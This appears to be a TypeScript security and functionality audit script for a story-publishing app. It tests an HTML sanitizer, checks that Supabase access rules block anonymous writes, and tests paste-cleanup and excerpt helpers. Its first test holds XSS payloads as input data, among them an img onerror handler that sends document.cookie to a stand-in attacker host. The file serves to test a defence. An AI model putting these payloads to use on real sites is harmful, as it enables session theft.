import path from 'path';
import dotenv from 'dotenv';
import { createClient } from '@supabase/supabase-js';
import { sanitizeStoryHtml } from '../src/lib/sanitizer';
import { cleanPastedText, calculateReadingTime, generateExcerpt } from '../src/lib/editor-utils';

dotenv.config({ path: path.join(process.cwd(), '.env.local') });

async function runPhase3Verification() {
  console.log('================================================================================');
  console.log('🛡️  PHASE 3 SECURITY & FUNCTIONALITY AUDIT');
  console.log('================================================================================\n');

  let passedTests = 0;
  let totalTests = 0;

  // ---------------------------------------------------------------------------
  // TEST 1: XSS Content Sanitization
  // ---------------------------------------------------------------------------
  totalTests++;
  console.log('--------------------------------------------------------------------------------');
  console.log('TEST 1: XSS Injection & Dangerous HTML Sanitization');
  console.log('--------------------------------------------------------------------------------');

  const maliciousPayload = `
    <p>Legitimate opening sentence of the story.</p>
    <script>alert("XSS Attack!");</script>
    <img src="x" onerror="document.location='http://attacker.com?cookie='+document.cookie" />
    <iframe src="http://evil-tracker.com"></iframe>
    <a href="javascript:alert('pwned')">Innocent Link</a>
    <p class="story-paragraph">Safe closing narrative with <em>emphasis</em> and <strong>bold</strong>.</p>
  `;

  const sanitizedOutput = sanitizeStoryHtml(maliciousPayload);

  console.log('Raw Input Payload:');
  console.log(maliciousPayload.trim());
  console.log('\nSanitized Output Result:');
  console.log(sanitizedOutput.trim());

  const hasScript = /<script/i.test(sanitizedOutput);
  const hasOnerror = /onerror/i.test(sanitizedOutput);
  const hasIframe = /<iframe/i.test(sanitizedOutput);
  const hasJavascriptUrl = /javascript:/i.test(sanitizedOutput);
  const preservesSafeContent =
    sanitizedOutput.includes('Legitimate opening sentence') &&
    sanitizedOutput.includes('<em>emphasis</em>') &&
    sanitizedOutput.includes('<strong>bold</strong>');

  if (!hasScript && !hasOnerror && !hasIframe && !hasJavascriptUrl && preservesSafeContent) {
    console.log('\n✅ PASS: Malicious scripts, handlers, iframes and javascript: URLs strictly stripped.');
    passedTests++;
  } else {
    console.error('\n❌ FAIL: Sanitizer failed to block dangerous payloads!');
  }

  // ---------------------------------------------------------------------------
  // TEST 2: Anonymous Public Visitor Blocked on Admin Writes
  // ---------------------------------------------------------------------------
  totalTests++;
  console.log('\n--------------------------------------------------------------------------------');
  console.log('TEST 2: Anonymous Public Client Blocked from Story Writes & Admin Operations');
  console.log('--------------------------------------------------------------------------------');

  const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

  if (supabaseUrl && supabaseAnonKey) {
    const anonClient = createClient(supabaseUrl, supabaseAnonKey);

    // Attempt direct unauthorized story insertion
    const { data: insertData, error: insertError, status: insertStatus } = await anonClient
      .from('stories')
      .insert({
        slug: 'hacked-draft-story',
        title: 'Hacked Draft Story',
        chapter_label: 'Chapter 0',
        order_index: 0,
        excerpt: 'Unauthorized attempt',
        content_html: '<p>Malicious insertion attempt</p>',
        visibility: 'draft',
      })
      .select();

    console.log(`Anon Write HTTP Status: ${insertStatus}`);
    if (insertError) {
      console.log(`✅ PASS: Anonymous insertion was rejected by Postgres RLS policy!`);
      console.log(`   Error Code: [${insertError.code}] ${insertError.message}`);
      passedTests++;
    } else {
      console.error(`❌ FAIL: Anonymous write succeeded! Data:`, insertData);
    }
  } else {
    console.warn('⚠️  Skipping network test: Supabase URL/key not present.');
  }

  // ---------------------------------------------------------------------------
  // TEST 3: Smart Paste Word/PDF Text Cleanup & Formatting Preservation
  // ---------------------------------------------------------------------------
  totalTests++;
  console.log('\n--------------------------------------------------------------------------------');
  console.log('TEST 3: Word/PDF Paste Cleaner (Page Numbers, Headers & Mid-sentence Line Breaks)');
  console.log('--------------------------------------------------------------------------------');

  const dirtyPastedText = `
Dust and Dazzle

The morning sun rose slowly over the village rooftops. For
him, the land had always provided everything necessary for a

42

quiet life. Yet the city lights flickered in the distant
horizon, promising wealth and modern comforts.
  `.trim();

  const { cleanedText, modified, changesCount } = cleanPastedText(dirtyPastedText);

  console.log('Dirty Pasted Input:');
  console.log(dirtyPastedText);
  console.log('\nCleaned Result:');
  console.log(cleanedText);
  console.log(`\nModified: ${modified}, Total Changes: ${changesCount}`);

  const hasPageNum = cleanedText.includes('42');
  const hasRunningHeader = cleanedText.includes('Dust and Dazzle\n\n');
  const rejoinsMidSentence1 = cleanedText.includes('For him, the land');
  const rejoinsMidSentence2 = cleanedText.includes('distant horizon, promising wealth');

  if (!hasPageNum && !hasRunningHeader && rejoinsMidSentence1 && rejoinsMidSentence2) {
    console.log('✅ PASS: Word/PDF paste cleaner accurately joined lines and eliminated page numbers/headers.');
    passedTests++;
  } else {
    console.error('❌ FAIL: Paste cleaning did not format text correctly!');
  }

  // ---------------------------------------------------------------------------
  // TEST 4: Live Word Count & Excerpt Generation
  // ---------------------------------------------------------------------------
  totalTests++;
  console.log('\n--------------------------------------------------------------------------------');
  console.log('TEST 4: Live Statistics & Auto-Excerpt Generation');
  console.log('--------------------------------------------------------------------------------');

  const testContent = '<p>The old grandfather clock ticked steadily in the dark hallway. Outside, rain tapped softly against the glass windowpane.</p><p>A third sentence that should not be in the short two-sentence excerpt.</p>';
  const excerptResult = generateExcerpt(testContent);
  const stats = calculateReadingTime('The old grandfather clock ticked steadily in the dark hallway.');

  console.log(`Generated Excerpt: "${excerptResult}"`);
  console.log(`Calculated Word Count: ${stats.wordCount}, Reading Time: ${stats.readingTime}`);

  if (excerptResult.startsWith('The old grandfather clock') && !excerptResult.includes('third sentence') && stats.wordCount === 10) {
    console.log('✅ PASS: Reading statistics and excerpt generation verified.');
    passedTests++;
  } else {
    console.error('❌ FAIL: Statistics calculation error.');
  }

  console.log('\n================================================================================');
  console.log(`AUDIT SUMMARY: ${passedTests}/${totalTests} Tests Passed`);
  console.log('================================================================================\n');

  if (passedTests === totalTests) {
    process.exit(0);
  } else {
    process.exit(1);
  }
}

runPhase3Verification().catch((err) => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
